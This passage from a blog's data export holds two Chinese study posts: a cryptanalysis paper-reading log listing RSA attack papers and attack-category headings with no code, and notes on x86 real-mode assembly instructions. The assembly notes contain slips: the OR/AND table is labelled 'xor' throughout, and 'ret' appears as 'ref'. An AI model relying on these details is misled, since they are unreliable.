d_{p_{bits}}/n_{bits}  \\\\\\\\\ns.t. \\enspace 3\\beta < 1+\\beta^2+2\\delta\n$$\n\n### 2. Modulus Fault Attacks Against RSA-CRT Signatures\n\n### 3. Merkle-Hellman Revisited: A Cryptanalysis of the Qu-Vanstone Cryptosystem Based on Group Factorizations\n\n### 4. A Strategy for Finding Roots of Multivariate Polynomials with New Applications in Attacking RSA Variants\n\n## 攻击汇总\n\n之前在 GitHub 上看到的一个很全的攻击汇总，记录下。\n\n### Approximate Common Divisor\n\n### CBC\n\n### CBC + CBC-MAC\n\n### CTR\n\n### ECB\n\n### Elliptic Curve Cryptography\n\n### ElGamal Encryption\n\n### ElgGamal Signature\n\n### Factorization\n\n已知部分 p 和 q\n已知部分 p, q 和 d\n已知部分 p, q, d, dp 和 dq\n已知部分 p\n已知 phi\n孪生素数（这个稍微有点逊）\n$p > q^3$ 且已知部分 p\n\n### GCM\n\n### Hidden Number Problem\n\n### IGE\n\n### Knapsack Cryptosystems\n\n### Linear Congruential Generators\n\n### Learning With Errors\n\n### Mersenne Twister\n\n### One-time Pad\n\n### Pseudoprimes\n\n### RC4\n\n### RSA\n\n### Shamir's Secret Sharing\n","slug":"密码学论文记","published":1,"updated":"2024-06-05T07:52:52.025Z","_id":"cl8wgpppd001hck6ghvy29kim","comments":1,"layout":"post","photos":[],"content":"<p>记录一下读的 Papers</p>\n<span id=\"more\"></span>\n\n<h2 id=\"常见词汇\"><a href=\"#常见词汇\" class=\"headerlink\" title=\"常见词汇\"></a>常见词汇</h2><p>devise 发明<br>permutation 置换<br>reciprocal 倒数<br>cardinality 基数<br>corollary 推论<br>canonica 规范的<br>symmetric 对称的<br>determinant 行列式<br>regarding 关于<br>map 映射<br>projection 投影<br>coordinate 坐标<br>denote 标示<br>rational 有理的<br>thus 因此<br>alternatively 或者<br>optimize 优化<br>anew 重新<br>tedious 乏味的<br>non-trivial 不平凡的<br>derive 得到<br>hence 因此<br>composite number 合数<br>or else 否则<br>scenario 方案<br>implicit 隐式的<br>analogous 相似的<br>asymptotical 渐进的<br>sake 目的<br>notation 符号</p>\n<h2 id=\"文章汇总\"><a href=\"#文章汇总\" class=\"headerlink\" title=\"文章汇总\"></a>文章汇总</h2><h3 id=\"1-Cryptanalysis-of-Unbalanced-RSA-with-Small-CRT-Exponent\"><a href=\"#1-Cryptanalysis-of-Unbalanced-RSA-with-Small-CRT-Exponent\" class=\"headerlink\" title=\"1. Cryptanalysis of Unbalanced RSA with Small CRT-Exponent\"></a>1. Cryptanalysis of Unbalanced RSA with Small CRT-Exponent</h3><p>第一篇正经详细读的论文，作者 Alexander May 挺 nb 的，多元 coppersmith 也是他和另一个人写的，有机会也读一下。<br>这篇 paper 主要讲 $p$ 和 $q$ 不平衡时的 RSA 攻击，还要满足 $d_p$ 足够小。具体如下：<br>$$<br>\\beta = q_{bits}/n_{bits}   \\\\<br>\\delta = d_{p_{bits}}/n_{bits}  \\\\<br>s.t. \\enspace 3\\beta &lt; 1+\\beta^2+2\\delta<br>$$</p>\n<h3 id=\"2-Modulus-Fault-Attacks-Against-RSA-CRT-Signatures\"><a href=\"#2-Modulus-Fault-Attacks-Against-RSA-CRT-Signatures\" class=\"headerlink\" title=\"2. Modulus Fault Attacks Against RSA-CRT Signatures\"></a>2. Modulus Fault Attacks Against RSA-CRT Signatures</h3><h3 id=\"3-Merkle-Hellman-Revisited-A-Cryptanalysis-of-the-Qu-Vanstone-Cryptosystem-Based-on-Group-Factorizations\"><a href=\"#3-Merkle-Hellman-Revisited-A-Cryptanalysis-of-the-Qu-Vanstone-Cryptosystem-Based-on-Group-Factorizations\" class=\"headerlink\" title=\"3. Merkle-Hellman Revisited: A Cryptanalysis of the Qu-Vanstone Cryptosystem Based on Group Factorizations\"></a>3. Merkle-Hellman Revisited: A Cryptanalysis of the Qu-Vanstone Cryptosystem Based on Group Factorizations</h3><h3 id=\"4-A-Strategy-for-Finding-Roots-of-Multivariate-Polynomials-with-New-Applications-in-Attacking-RSA-Variants\"><a href=\"#4-A-Strategy-for-Finding-Roots-of-Multivariate-Polynomials-with-New-Applications-in-Attacking-RSA-Variants\" class=\"headerlink\" title=\"4. A Strategy for Finding Roots of Multivariate Polynomials with New Applications in Attacking RSA Variants\"></a>4. A Strategy for Finding Roots of Multivariate Polynomials with New Applications in Attacking RSA Variants</h3><h2 id=\"攻击汇总\"><a href=\"#攻击汇总\" class=\"headerlink\" title=\"攻击汇总\"></a>攻击汇总</h2><p>之前在 GitHub 上看到的一个很全的攻击汇总，记录下。</p>\n<h3 id=\"Approximate-Common-Divisor\"><a href=\"#Approximate-Common-Divisor\" class=\"headerlink\" title=\"Approximate Common Divisor\"></a>Approximate Common Divisor</h3><h3 id=\"CBC\"><a href=\"#CBC\" class=\"headerlink\" title=\"CBC\"></a>CBC</h3><h3 id=\"CBC-CBC-MAC\"><a href=\"#CBC-CBC-MAC\" class=\"headerlink\" title=\"CBC + CBC-MAC\"></a>CBC + CBC-MAC</h3><h3 id=\"CTR\"><a href=\"#CTR\" class=\"headerlink\" title=\"CTR\"></a>CTR</h3><h3 id=\"ECB\"><a href=\"#ECB\" class=\"headerlink\" title=\"ECB\"></a>ECB</h3><h3 id=\"Elliptic-Curve-Cryptography\"><a href=\"#Elliptic-Curve-Cryptography\" class=\"headerlink\" title=\"Elliptic Curve Cryptography\"></a>Elliptic Curve Cryptography</h3><h3 id=\"ElGamal-Encryption\"><a href=\"#ElGamal-Encryption\" class=\"headerlink\" title=\"ElGamal Encryption\"></a>ElGamal Encryption</h3><h3 id=\"ElgGamal-Signature\"><a href=\"#ElgGamal-Signature\" class=\"headerlink\" title=\"ElgGamal Signature\"></a>ElgGamal Signature</h3><h3 id=\"Factorization\"><a href=\"#Factorization\" class=\"headerlink\" title=\"Factorization\"></a>Factorization</h3><p>已知部分 p 和 q<br>已知部分 p, q 和 d<br>已知部分 p, q, d, dp 和 dq<br>已知部分 p<br>已知 phi<br>孪生素数（这个稍微有点逊）<br>$p &gt; q^3$ 且已知部分 p</p>\n<h3 id=\"GCM\"><a href=\"#GCM\" class=\"headerlink\" title=\"GCM\"></a>GCM</h3><h3 id=\"Hidden-Number-Problem\"><a href=\"#Hidden-Number-Problem\" class=\"headerlink\" title=\"Hidden Number Problem\"></a>Hidden Number Problem</h3><h3 id=\"IGE\"><a href=\"#IGE\" class=\"headerlink\" title=\"IGE\"></a>IGE</h3><h3 id=\"Knapsack-Cryptosystems\"><a href=\"#Knapsack-Cryptosystems\" class=\"headerlink\" title=\"Knapsack Cryptosystems\"></a>Knapsack Cryptosystems</h3><h3 id=\"Linear-Congruential-Generators\"><a href=\"#Linear-Congruential-Generators\" class=\"headerlink\" title=\"Linear Congruential Generators\"></a>Linear Congruential Generators</h3><h3 id=\"Learning-With-Errors\"><a href=\"#Learning-With-Errors\" class=\"headerlink\" title=\"Learning With Errors\"></a>Learning With Errors</h3><h3 id=\"Mersenne-Twister\"><a href=\"#Mersenne-Twister\" class=\"headerlink\" title=\"Mersenne Twister\"></a>Mersenne Twister</h3><h3 id=\"One-time-Pad\"><a href=\"#One-time-Pad\" class=\"headerlink\" title=\"One-time Pad\"></a>One-time Pad</h3><h3 id=\"Pseudoprimes\"><a href=\"#Pseudoprimes\" class=\"headerlink\" title=\"Pseudoprimes\"></a>Pseudoprimes</h3><h3 id=\"RC4\"><a href=\"#RC4\" class=\"headerlink\" title=\"RC4\"></a>RC4</h3><h3 id=\"RSA\"><a href=\"#RSA\" class=\"headerlink\" title=\"RSA\"></a>RSA</h3><h3 id=\"Shamir’s-Secret-Sharing\"><a href=\"#Shamir’s-Secret-Sharing\" class=\"headerlink\" title=\"Shamir’s Secret Sharing\"></a>Shamir’s Secret Sharing</h3>","excerpt":"<p>记录一下读的 Papers</p>","more":"<h2 id=\"常见词汇\"><a href=\"#常见词汇\" class=\"headerlink\" title=\"常见词汇\"></a>常见词汇</h2><p>devise 发明<br>permutation 置换<br>reciprocal 倒数<br>cardinality 基数<br>corollary 推论<br>canonica 规范的<br>symmetric 对称的<br>determinant 行列式<br>regarding 关于<br>map 映射<br>projection 投影<br>coordinate 坐标<br>denote 标示<br>rational 有理的<br>thus 因此<br>alternatively 或者<br>optimize 优化<br>anew 重新<br>tedious 乏味的<br>non-trivial 不平凡的<br>derive 得到<br>hence 因此<br>composite number 合数<br>or else 否则<br>scenario 方案<br>implicit 隐式的<br>analogous 相似的<br>asymptotical 渐进的<br>sake 目的<br>notation 符号</p>\n<h2 id=\"文章汇总\"><a href=\"#文章汇总\" class=\"headerlink\" title=\"文章汇总\"></a>文章汇总</h2><h3 id=\"1-Cryptanalysis-of-Unbalanced-RSA-with-Small-CRT-Exponent\"><a href=\"#1-Cryptanalysis-of-Unbalanced-RSA-with-Small-CRT-Exponent\" class=\"headerlink\" title=\"1. Cryptanalysis of Unbalanced RSA with Small CRT-Exponent\"></a>1. Cryptanalysis of Unbalanced RSA with Small CRT-Exponent</h3><p>第一篇正经详细读的论文，作者 Alexander May 挺 nb 的，多元 coppersmith 也是他和另一个人写的，有机会也读一下。<br>这篇 paper 主要讲 $p$ 和 $q$ 不平衡时的 RSA 攻击，还要满足 $d_p$ 足够小。具体如下：<br>$$<br>\\beta = q_{bits}/n_{bits}   \\\\<br>\\delta = d_{p_{bits}}/n_{bits}  \\\\<br>s.t. \\enspace 3\\beta &lt; 1+\\beta^2+2\\delta<br>$$</p>\n<h3 id=\"2-Modulus-Fault-Attacks-Against-RSA-CRT-Signatures\"><a href=\"#2-Modulus-Fault-Attacks-Against-RSA-CRT-Signatures\" class=\"headerlink\" title=\"2. Modulus Fault Attacks Against RSA-CRT Signatures\"></a>2. Modulus Fault Attacks Against RSA-CRT Signatures</h3><h3 id=\"3-Merkle-Hellman-Revisited-A-Cryptanalysis-of-the-Qu-Vanstone-Cryptosystem-Based-on-Group-Factorizations\"><a href=\"#3-Merkle-Hellman-Revisited-A-Cryptanalysis-of-the-Qu-Vanstone-Cryptosystem-Based-on-Group-Factorizations\" class=\"headerlink\" title=\"3. Merkle-Hellman Revisited: A Cryptanalysis of the Qu-Vanstone Cryptosystem Based on Group Factorizations\"></a>3. Merkle-Hellman Revisited: A Cryptanalysis of the Qu-Vanstone Cryptosystem Based on Group Factorizations</h3><h3 id=\"4-A-Strategy-for-Finding-Roots-of-Multivariate-Polynomials-with-New-Applications-in-Attacking-RSA-Variants\"><a href=\"#4-A-Strategy-for-Finding-Roots-of-Multivariate-Polynomials-with-New-Applications-in-Attacking-RSA-Variants\" class=\"headerlink\" title=\"4. A Strategy for Finding Roots of Multivariate Polynomials with New Applications in Attacking RSA Variants\"></a>4. A Strategy for Finding Roots of Multivariate Polynomials with New Applications in Attacking RSA Variants</h3><h2 id=\"攻击汇总\"><a href=\"#攻击汇总\" class=\"headerlink\" title=\"攻击汇总\"></a>攻击汇总</h2><p>之前在 GitHub 上看到的一个很全的攻击汇总，记录下。</p>\n<h3 id=\"Approximate-Common-Divisor\"><a href=\"#Approximate-Common-Divisor\" class=\"headerlink\" title=\"Approximate Common Divisor\"></a>Approximate Common Divisor</h3><h3 id=\"CBC\"><a href=\"#CBC\" class=\"headerlink\" title=\"CBC\"></a>CBC</h3><h3 id=\"CBC-CBC-MAC\"><a href=\"#CBC-CBC-MAC\" class=\"headerlink\" title=\"CBC + CBC-MAC\"></a>CBC + CBC-MAC</h3><h3 id=\"CTR\"><a href=\"#CTR\" class=\"headerlink\" title=\"CTR\"></a>CTR</h3><h3 id=\"ECB\"><a href=\"#ECB\" class=\"headerlink\" title=\"ECB\"></a>ECB</h3><h3 id=\"Elliptic-Curve-Cryptography\"><a href=\"#Elliptic-Curve-Cryptography\" class=\"headerlink\" title=\"Elliptic Curve Cryptography\"></a>Elliptic Curve Cryptography</h3><h3 id=\"ElGamal-Encryption\"><a href=\"#ElGamal-Encryption\" class=\"headerlink\" title=\"ElGamal Encryption\"></a>ElGamal Encryption</h3><h3 id=\"ElgGamal-Signature\"><a href=\"#ElgGamal-Signature\" class=\"headerlink\" title=\"ElgGamal Signature\"></a>ElgGamal Signature</h3><h3 id=\"Factorization\"><a href=\"#Factorization\" class=\"headerlink\" title=\"Factorization\"></a>Factorization</h3><p>已知部分 p 和 q<br>已知部分 p, q 和 d<br>已知部分 p, q, d, dp 和 dq<br>已知部分 p<br>已知 phi<br>孪生素数（这个稍微有点逊）<br>$p &gt; q^3$ 且已知部分 p</p>\n<h3 id=\"GCM\"><a href=\"#GCM\" class=\"headerlink\" title=\"GCM\"></a>GCM</h3><h3 id=\"Hidden-Number-Problem\"><a href=\"#Hidden-Number-Problem\" class=\"headerlink\" title=\"Hidden Number Problem\"></a>Hidden Number Problem</h3><h3 id=\"IGE\"><a href=\"#IGE\" class=\"headerlink\" title=\"IGE\"></a>IGE</h3><h3 id=\"Knapsack-Cryptosystems\"><a href=\"#Knapsack-Cryptosystems\" class=\"headerlink\" title=\"Knapsack Cryptosystems\"></a>Knapsack Cryptosystems</h3><h3 id=\"Linear-Congruential-Generators\"><a href=\"#Linear-Congruential-Generators\" class=\"headerlink\" title=\"Linear Congruential Generators\"></a>Linear Congruential Generators</h3><h3 id=\"Learning-With-Errors\"><a href=\"#Learning-With-Errors\" class=\"headerlink\" title=\"Learning With Errors\"></a>Learning With Errors</h3><h3 id=\"Mersenne-Twister\"><a href=\"#Mersenne-Twister\" class=\"headerlink\" title=\"Mersenne Twister\"></a>Mersenne Twister</h3><h3 id=\"One-time-Pad\"><a href=\"#One-time-Pad\" class=\"headerlink\" title=\"One-time Pad\"></a>One-time Pad</h3><h3 id=\"Pseudoprimes\"><a href=\"#Pseudoprimes\" class=\"headerlink\" title=\"Pseudoprimes\"></a>Pseudoprimes</h3><h3 id=\"RC4\"><a href=\"#RC4\" class=\"headerlink\" title=\"RC4\"></a>RC4</h3><h3 id=\"RSA\"><a href=\"#RSA\" class=\"headerlink\" title=\"RSA\"></a>RSA</h3><h3 id=\"Shamir’s-Secret-Sharing\"><a href=\"#Shamir’s-Secret-Sharing\" class=\"headerlink\" title=\"Shamir’s Secret Sharing\"></a>Shamir’s Secret Sharing</h3>"},{"title":"汇编学习笔记","date":"2022-04-06T14:21:00.000Z","_content":"进行一些笔记的整理\n<!--more-->\n## 前言\n\n上年暑假就学了 x86 汇编的实模式部分，当时用 Onenote 记了一些笔记，后来发现了 Markdown 这个好东西，就决定搬迁一下，也方便我上课查（bushi\n\n格式有待整理（逃\n\n## 寄存器\n\n### 通用寄存器\n\n寄存器| 全称 | 中文名称\n:--------:|:--------:|:-------:\nCS|Code Segment         |代码段寄存器\nDS|Data Segment         |数据段寄存器\nES|Extra Segment        |附加段寄存器\nSS|Stack Segment        |栈段\nSP|Stack Pointer        |栈指针寄存器\nIP|Instruction Pointer  |指令指针寄存器\nSI|Source Index         |源索引（变址）寄存器\nDI|Destination Index    |目标索引寄存器\nAX|Accumulator          |累加器\nBX|Base Address Register|基地址寄存器\nCX|Counter              |计数器\nDX|Data                 |数据寄存器\n\n### 标志寄存器\n\nIndex| 名称 | 说明\n:--------:|:--------:|:-------:\n第0位|CF|进位标志，进行算术操作时，如果最高位有向前进位或借位的情况发生，则CF=1，否则CF=0，少数指令除外（如inc和dec）\n第2位|PF|奇偶标志，运算结果最低8位，有偶数个为1的比特则PF=1，否则PF=0\n第4位|AF|无\n第6位|ZF（Zero Flag）|零标志，当处理器执行一条算数或者逻辑运算指令后，抓住逻辑部件送出的结果除了送到指令中指定位置，还送到一个或非门，如果计算结果为0，ZF被置成1，表示计算结果为零是“真”的，否则清除此位（0）\n第7位|SF（Sign Flag）|符号位，如dec计算结果的最高位是比特“0”，SF置“0”，否则置“1”\n第8位|TF|无\n第9位|IF|无\n第10位|DF（Direction Flag）|方向标志，可控制movsb和movsw的传送方向\n第11位|OF|即溢出标志，用于指示两个有符号数的运算结果是否错误，如果结果正确，则OF=0，否则OF=1\n\n## 指令\n\n### mov\n\n示例：\nmov ah,bh\nmov ax,dx\nmov [0x02],bl\nmov ax,[0x06]\nmov ah,0x05\nmov word [0x1c],0xf000\n\n### db（Declare Byte）\n\n伪指令，跟在后面的操作数都占一个字节的长度，如果要声明超过一个以上的数据，各个操作数之间必须以逗号隔开\n\n### div\n\n1. 用16位的二进制数除以8位的二进制数：\n被除数必须在寄存器AX中，必须先传送到AX寄存器里，除数可以由8位的通用寄存器或者内存单元提供\n执行后：商在AL中，余数在AH中\n2. 用32位的二进制数除以16位的二进制数：\n被除数的高16位在DX中，低16位在AX中\n执行后：商在AX中，余数在DX中\n\n### xor\n\n0 xor 0 = 0\n0 xor 1 = 1\n1 xor 0 = 1\n1 xor 1 = 0\n常用于清零\n\n### times\n\n伪指令，重复后面的指令若干次\n例：times 100 db 0\n\n### movsb和movsw\n\n原始数据串的段地址由 DS 指定，偏移地址由 SI 指定，简写为 DS：SI ，目的地址为 ES：DI ，传送的字节数或者字数由 CX 指定，每传送一次， CX 内容减一\n正向传送时传送操作方向是从内存区域低地址端到高地址端，每传送一个字节或一个字时， SI 和 DI 加 1 或者加 2 ，反向传送则相反\n\n### cld和std\n\n**cld**:将 DF 标志清零，指示传送是正方向的\n**std**:与 `cld` 相反\n\n### loop\n\n执行时 CX 减一，若 CX 内容不为零，转移到指定的位置执行，否则顺序后面的指令\n\n### rep\n\n指令前缀，即 repeat\nCX 不为零则重复\n\n### inc和dec\n\n**inc**:加一指令，`inc bx` 和 `add bx,1` 功能一样，但前者机器码更短，速度更快\n**dec**:减一指令，与 `inc` 格式相同\n\n### neg\n\n用 0 减去指令中指定的操作数\n\n### cbw和cwd\n\n两条指令后都没有操作数\n**cbw**（Convert Byte to Word）：将 AL 中的有符号数扩展到整个 AX\n**cwd**（Convert Word to Double-word）：将 AX 中的有符号数扩展到 DX：AX 中\n\n### idiv\n\ndiv 为无符号除尘指令（Unsigned Divide）\nidiv 指令格式与 div 相同，专门用于计算有符号数\n\n### sub\n\n与加法指令 `add` 类似，但处理器没有减法运算电路，故 `sub ah,al` 等效\nneg al\nadd ah,al\n\n### cmp\n\n功能上和 `sub` 指令相同，但仅影响相应标志位（CF、OF、SF、ZF、AF和PF），而不保留计算结果，因此不会改变两个操作数的原有内容\n\n### or和and\n\nor | and\n---------|----------\n0 xor 0 = 0|0 xor 0 = 0\n0 xor 1 = 1|0 xor 1 = 0\n1 xor 0 = 1|1 xor 0 = 0\n1 xor 1 = 1|1 xor 1 = 1\n\n对标志寄存器影响： OF 和 CF 位被清零， SF、ZF、PF 的状态依计算结果而定\n\n### push和pop\n\n操作数可以是寄存器或者内存单元，逻辑地址为 SS：SP ，不影响任何标志位\n**push**：执行时将 SP 内容减去操作数的字长，从高地址端向低地址端推进\n**pop**：执行时将 SP 内容加上操作数的字长\n\n### in和out\n\n`in` 指令是从端口读，一般形式是\nin al,dx\nin ax,dx\nin 指令的操作数必须是寄存器 AL 或者 AX ，用于访问 8 位或 16 位的端口，源操作数应当是寄存器 DX ， `in` 指令为 2 字节形式时，后一字节是立即数\n `out` 指令和 `in` 指令相反\n两个指令均不影响任何标志位\n\n### call、ref和retf指令\n\n8086处理器支持四种调用方式\n    i. 16位相对近调用。近调用的意思是被调用的目标过程位于当前代码段内，而非另一个不同的代码段，故只需得到偏移地址即可，计算过程为：用目标过程的汇编地址减去当前call指令的汇编地址，再减去当前call指令以字节为单位的长度(3)，保留16位的结果，近调用的特征是在指令中使用关键字\"near\"，若没有提供任何关键字，则编译器认为该指令是近调用，其机器指令操作数是一个16位的有符号数，被调用过程的首地址必须位于距离当前call指令-32768~32767字节的地方\n    ii. 16位间接绝对近调用。这种调用也是近调用，只能调用当前代码段内的过程，指令中的操作数不是偏移量，而是被调用过程的真实偏移地址，故称为绝对地址，该偏移地址不直接出现在指令中，而是由16位的通用寄存器或者16位的内存单元间接提供，机器指令的操作是16位的绝对地址，故可以调用当前代码段任何位置处的过程\n    iii. 16位直接绝对远调用。这种调用属于段间调用，即调用另一个代码段的过程，\"16位\"是针对偏移地址来说的，而不是限定段地址，\"直接\"的意思，段地接和偏移地址直接在call指令中给出，先后将CS和IP进行压栈和出栈\n    iv. 16位间接绝对远调用。同样属于段间调用，\"16位\"同样用于限定偏移地址，必须使用关键字\"far\"，例：\n        proc_1 dw 0x0102,0x2000\n        call far [proc_1]\n    0x0102是偏移地址，0x2000是段地址，指令执行时，处理器访问DS指向的数据段，从指令中指定的偏移地址处取得两个字（段地址0x2000和偏移地址0x0102），再将CS和IP分别压栈和取代\nref是近返回指令，从栈中弹出一个字到IP中\nretf是远返回指令，分别从栈中弹出两个字到IP和CS中\n\n### shr、shl、ror、rol\n\n**shr**（Shift logical Right），即逻辑右移指令，将AX中的内容右移4位，执行时将操作数连续右移指定次数，每次溢出的比特被移到CF位，空出的位置用“0”填充，目的操作数可以是8位或16位通用寄存器/内存单元，源操作数可以是1或8位立即数或寄存器CL，当使用CL时，对于目的操作数是内存地址的情况，须使用关键字byte或word等来加限定，如：\n    shr al,cl\n    shr byte [bx],cl\nror（Rotate Right），即循环右移指令，执行时每右移一次，移出的比特既送到CF位，也送进左边空出的位\n\n### jmp\n\n若JMP之后是标号，则编译为相对转移指令0xE9，操作数为相对偏移题，执行时IP+操作数+长度，此时为相对近转移\n8086处理器的无条件转移指令（“16位”意为要转移到的目标位置的偏移地址是16位的）\n\n1. 相对短转移。操作码为0xEB，操作数是相对于目标位置的偏移量，仅1字节，且为有符号数，故该指令属于段内转移指令，且只允许转移到距离当前-128~127字节的地方，该指令须使用关键字“short”，例：\n    jmp shor infinite\n2. 16位相对近转移。转移范围较相对短转移稍大，操作码为0xE9，操作数为2字节，属于段内转移，可转移到距当前指令-32768~32767字节的地方，该指令应使用关键字“near”\n3. 16位间接绝对近转移。转移到的目标偏移地址不是在指令中直接给出，而是用一个16位的通用寄存器或者内存地址间接给出，关键字“near“可以省略，例：\n    jmp near bx\n    jmp near cx\n    jump_dest dw 0xc000\n    jmp [jump_dest]\n    jmp [bx]\n4. 16位直接绝对远转移。在指令中直接给出段地址和偏移地址的转移指令，例：\n    jmp 0x0000:0x7c00\n5. 16位间接绝对远转移。该指令要使用关键字”far”，例：\n    jump_far dw 0x33c0,0xf000\n    jmp far [jump_far]\n\n**resb**（REServe Byte）、resw和resd指令\n**resb**:从当前位置开始，保留指定数量的字节，但不进行初始化\n\n### mul\n\n可以用8位的通用寄存器或者内存单元中的数和寄存器AL中的内容相乘，结果是16位，在AX寄存器中，也可以用16位的通用寄存器或者内存单元中的数和寄存器AX中的内容相乘，结果是32位，高16位和低16位分别在DX和AX中，指令执行后，若结果的高一半全为0，则OF和CF清零，否则置1\n\n## 参考\n\n《x86汇编语言——从实模式到保护模式》——李忠 著\n","source":"_posts/汇编学习笔记.md","raw":"---\ntitle: 汇编学习笔记\ndate: 2022-04-06 22:21:00\ntags: [汇编]\ncategories: 学习\n---\n进行一些笔记的整理\n<!--more-->\n## 前言\n\n上年暑假就学了 x86 汇编的实模式部分，当时用 Onenote 记了一些笔记，后来发现了 Markdown 这个好东西，就决定搬迁一下，也方便我上课查（bushi\n\n格式有待整理（逃\n\n## 寄存器\n\n### 通用寄存器\n\n寄存器| 全称 | 中文名称\n:--------:|:--------:|:-------:\nCS|Code Segment         |代码段寄存器\nDS|Data Segment         |数据段寄存器\nES|Extra Segment        |附加段寄存器\nSS|Stack Segment        |栈段\nSP|Stack Pointer        |栈指针寄存器\nIP|Instruction Pointer  |指令指针寄存器\nSI|Source Index         |源索引（变址）寄存器\nDI|Destination Index    |目标索引寄存器\nAX|Accumulator          |累加器\nBX|Base Address Register|基地址寄存器\nCX|Counter              |计数器\nDX|Data                 |数据寄存器\n\n### 标志寄存器\n\nIndex| 名称 | 说明\n:--------:|:--------:|:-------:\n第0位|CF|进位标志，进行算术操作时，如果最高位有向前进位或借位的情况发生，则CF=1，否则CF=0，少数指令除外（如inc和dec）\n第2位|PF|奇偶标志，运算结果最低8位，有偶数个为1的比特则PF=1，否则PF=0\n第4位|AF|无\n第6位|ZF（Zero Flag）|零标志，当处理器执行一条算数或者逻辑运算指令后，抓住逻辑部件送出的结果除了送到指令中指定位置，还送到一个或非门，如果计算结果为0，ZF被置成1，表示计算结果为零是“真”的，否则清除此位（0）\n第7位|SF（Sign Flag）|符号位，如dec计算结果的最高位是比特“0”，SF置“0”，否则置“1”\n第8位|TF|无\n第9位|IF|无\n第10位|DF（Direction Flag）|方向标志，可控制movsb和movsw的传送方向\n第11位|OF|即溢出标志，用于指示两个有符号数的运算结果是否错误，如果结果正确，则OF=0，否则OF=1\n\n## 指令\n\n### mov\n\n示例：\nmov ah,bh\nmov ax,dx\nmov [0x02],bl\nmov ax,[0x06]\nmov ah,0x05\nmov word [0x1c],0xf000\n\n### db（Declare Byte）\n\n伪指令，跟在后面的操作数都占一个字节的长度，如果要声明超过一个以上的数据，各个操作数之间必须以逗号隔开\n\n### div\n\n1. 用16位的二进制数除以8位的二进制数：\n被除数必须在寄存器AX中，必须先传送到AX寄存器里，除数可以由8位的通用寄存器或者内存单元提供\n执行后：商在AL中，余数在AH中\n2. 用32位的二进制数除以16位的二进制数：\n被除数的高16位在DX中，低16位在AX中\n执行后：商在AX中，余数在DX中\n\n### xor\n\n0 xor 0 = 0\n0 xor 1 = 1\n1 xor 0 = 1\n1 xor 1 = 0\n常用于清零\n\n### times\n\n伪指令，重复后面的指令若干次\n例：times 100 db 0\n\n### movsb和movsw\n\n原始数据串的段地址由 DS 指定，偏移地址由 SI 指定，简写为 DS：SI ，目的地址为 ES：DI ，传送的字节数或者字数由 CX 指定，每传送一次， CX 内容减一\n正向传送时传送操作方向是从内存区域低地址端到高地址端，每传送一个字节或一个字时， SI 和 DI 加 1 或者加 2 ，反向传送则相反\n\n### cld和std\n\n**cld**:将 DF 标志清零，指示传送是正方向的\n**std**:与 `cld` 相反\n\n### loop\n\n执行时 CX 减一，若 CX 内容不为零，转移到指定的位置执行，否则顺序后面的指令\n\n### rep\n\n指令前缀，即 repeat\nCX 不为零则重复\n\n### inc和dec\n\n**inc**:加一指令，`inc bx` 和 `add bx,1` 功能一样，但前者机器码更短，速度更快\n**dec**:减一指令，与 `inc` 格式相同\n\n### neg\n\n用 0 减去指令中指定的操作数\n\n### cbw和cwd\n\n两条指令后都没有操作数\n**cbw**（Convert Byte to Word）：将 AL 中的有符号数扩展到整个 AX\n**cwd**（Convert Word to Double-word）：将 AX 中的有符号数扩展到 DX：AX 中\n\n### idiv\n\ndiv 为无符号除尘指令（Unsigned Divide）\nidiv 指令格式与 div 相同，专门用于计算有符号数\n\n### sub\n\n与加法指令 `add` 类似，但处理器没有减法运算电路，故 `sub ah,al` 等效\nneg al\nadd ah,al\n\n### cmp\n\n功能上和 `sub` 指令相同，但仅影响相应标志位（CF、OF、SF、ZF、AF和PF），而不保留计算结果，因此不会改变两个操作数的原有内容\n\n### or和and\n\nor | and\n---------|----------\n0 xor 0 = 0|0 xor 0 = 0\n0 xor 1 = 1|0 xor 1 = 0\n1 xor 0 = 1|1 xor 0 = 0\n1 xor 1 = 1|1 xor 1 = 1\n\n对标志寄存器影响： OF 和 CF 位被清零， SF、ZF、PF 的状态依计算结果而定\n\n### push和pop\n\n操作数可以是寄存器或者内存单元，逻辑地址为 SS：SP ，不影响任何标志位\n**push**：执行时将 SP 内容减去操作数的字长，从高地址端向低地址端推进\n**pop**：执行时将 SP 内容加上操作数的字长\n\n### in和out\n\n`in` 指令是从端口读，一般形式是\nin al,dx\nin ax,dx\nin 指令的操作数必须是寄存器 AL 或者 AX ，用于访问 8 位或 16 位的端口，源操作数应当是寄存器 DX ， `in` 指令为 2 字节形式时，后一字节是立即数\n `out` 指令和 `in` 指令相反\n两个指令均不影响任何标志位\n\n### call、ref和retf指令\n\n8086处理器支持四种调用方式\n    i. 16位相对近调用。近调用的意思是被调用的目标过程位于当前代码段内，而非另一个不同的代码段，故只需得到偏移地址即可，计算过程为：用目标过程的汇编地址减去当前call指令的汇编地址，再减去当前call指令以字节为单位的长度(3)，保留16位的结果，近调用的特征是在指令中使用关键字\"near\"，若没有提供任何关键字，则编译器认为该指令是近调用，其机器指令操作数是一个16位的有符号数，被调用过程的首地址必须位于距离当前call指令-32768~32767字节的地方\n    ii. 16位间接绝对近调用。这种调用也是近调用，只能调用当前代码段内的过程，指令中的操作数不是偏移量，而是被调用过程的真实偏移地址，故称为绝对地址，该偏移地址不直接出现在指令中，而是由16位的通用寄存器或者16位的内存单元间接提供，机器指令的操作是16位的绝对地址，故可以调用当前代码段任何位置处的过程\n    iii. 16位直接绝对远调用。这种调用属于段间调用，即调用另一个代码段的过程，\"16位\"是针对偏移地址来说的，而不是限定段地址，\"直接\"的意思，段地接和偏移地址直接在call指令中给出，先后将CS和IP进行压栈和出栈\n    iv. 16位间接绝对远调用。同样属于段间调用，\"16位\"同样用于限定偏移地址，必须使用关键字\"far\"，例：\n        proc_1 dw 0x0102,0x2000\n        call far [proc_1]\n    0x0102是偏移地址，0x2000是段地址，指令执行时，处理器访问DS指向的数据段，从指令中指定的偏移地址处取得两个字（段地址0x2000和偏移地址0x0102），再将CS和IP分别压栈和取代\nref是近返回指令，从栈中弹出一个字到IP中\nretf是远返回指令，分别从栈中弹出两个字到IP和CS中\n\n### shr、shl、ror、rol\n\n**shr**（Shift logical Right），即逻辑右移指令，将AX中的内容右移4位，执行时将操作数连续右移指定次数，每次溢出的比特被移到CF位，空出的位置用“0”填充，目的操作数可以是8位或16位通用寄存器/内存单元，源操作数可以是1或8位立即数或寄存器CL，当使用CL时，对于目的操作数是内存地址的情况，须使用关键字byte或word等来加限定，如：\n    shr al,cl\n    shr byte [bx],cl\nror（Rotate Right），即循环右移指令，执行时每右移一次，移出的比特既送到CF位，也送进左边空出的位\n\n### 